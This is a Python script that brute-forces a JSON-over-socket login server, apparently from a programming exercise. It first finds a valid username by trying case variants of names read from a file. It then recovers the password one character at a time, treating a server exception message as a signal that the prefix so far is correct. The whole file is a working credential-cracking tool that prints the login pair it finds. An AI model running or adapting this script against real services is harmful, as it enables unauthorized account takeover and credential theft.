import socket
import argparse
import string
import itertools
import json


BUFFER_SIZE = 1024


def create_socket():
    return socket.socket()


def connect_to_server(client_socket, address):
    client_socket.connect(address)


def send_message(client_socket, login, password):
    message = {"login": login, "password": password}
    json_message = json.dumps(message)
    client_socket.sendall(json_message.encode())
    response_bytes = client_socket.recv(BUFFER_SIZE)
    response_str = response_bytes.decode('utf-8')
    return json.loads(response_str)


def generate_password():
    valid_chars = string.ascii_letters + string.digits + string.punctuation
    for password in itertools.product(valid_chars):
        yield ''.join(password)


def generate_login():
    login_dictionary = read_logins_from_file()
    for login in login_dictionary:
        for combination in itertools.product(*zip(login.upper(), login.lower())):
            yield "".join(combination)


def read_logins_from_file():
    with open('logins.txt', 'r') as file:
        return [line.strip() for line in file]


def main(ip_address, port):
    address = (ip_address, port)
    with create_socket() as client_socket:
        connect_to_server(client_socket, address)
        login_generator = generate_login()
        login = next(login_generator)
        password_generator = generate_password()
        password = next(password_generator)
        response = send_message(client_socket, login, password)

        while response["result"] != "Connection success!":

            if response["result"] == "Wrong login!":
                login = next(login_generator)
            elif response["result"] == "Wrong password!":
                password = password[:-1] + next(password_generator)
            elif response["result"] == "Exception happened during login":
                password_generator = generate_password()
                password = password + next(password_generator)

            response = send_message(client_socket, login, password)
        success_output = {"login": login, "password": password}
        print(json.dumps(success_output))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip_address", type=str)
    parser.add_argument("port", type=int)
    args = parser.parse_args()
    main(args.ip_address, args.port)

